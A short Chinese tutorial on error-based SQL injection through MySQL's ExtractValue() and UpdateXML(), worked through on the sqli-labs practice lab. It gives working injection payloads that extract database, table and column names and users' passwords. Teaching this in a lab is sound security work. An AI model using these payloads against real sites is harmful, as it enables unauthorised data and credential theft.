extractvalue、updatexml

extractvalue(): 使用 XPath 从 XML 字符串中提取值

UpdateXML() ： 替换 XML 片段

Extractvalue:

ExtractValue(xml_frag, xpath_expr)

ExtractValue()接受两个字符串参数，一个 XML 标记片段 xml_frag和一个 XPath 表达式 _xpath_expr_（也称为 定位器）; 它返回CDATA第一个文本节点的 text（），该节点是 XPath 表达式匹配的元素的子元素。

第一个参数可以传入目标 xml 文档，第二个参数是用 Xpath 路径法表示的查找路径

例如：SELECT ExtractValue('', '/a/b'); 就是寻找前一段 xml 文档内容中的 a 节点下的 b 节点，这里如果 Xpath 格式语法书写错误的话，就会报错。这里就是利用这个特性来获得我们想要知道的内容。

例如：select * from admin where id='1' and Extractvalue('', CONCAT('~', (SELECT DATABASE())))

以 sqli-labs 第 5 关为例：

可以使用: id=1' and ExtractValue('', concat('~', (select database()))) -- '查询出当前使用的数据库

可以使用：?id=1' and ExtractValue('', concat('~', (select group_concat(table_name) from information_schema.tables where table_schema = database()))) -- ' 获取表名

可以使用：?id=1' and ExtractValue('', concat('~', (select group_concat(column_name) from information_schema.columns where table_name = 'users'))) -- '获取表的字段名称

可以使用：?id=1' and ExtractValue('', concat('~', (select concat(username, ' - ', password) from users where id=1))) -- '查询 id 为 1 的用户名和密码

updateXML():

UpdateXML(xml_target, xpath_expr, new_xml)

xml_target:： 需要操作的 xml 片段

xpath_expr： 需要更新的 xml 路径(Xpath 格式)

new_xml： 更新后的内容

举例： select * from admin where id='1' and updateXML('', CONCAT('~',(SELECT database())), '')

同样可以类似上面ExtractValue()报错注入，替换相应的 payload，即可实现获取数据。

补充

在使用concat()函数进行拼接字符串时，建议使用中文下的标点符号或英文状态下的~, 在使用.进行拼接时，报错会直接显示数据库名称，没有.
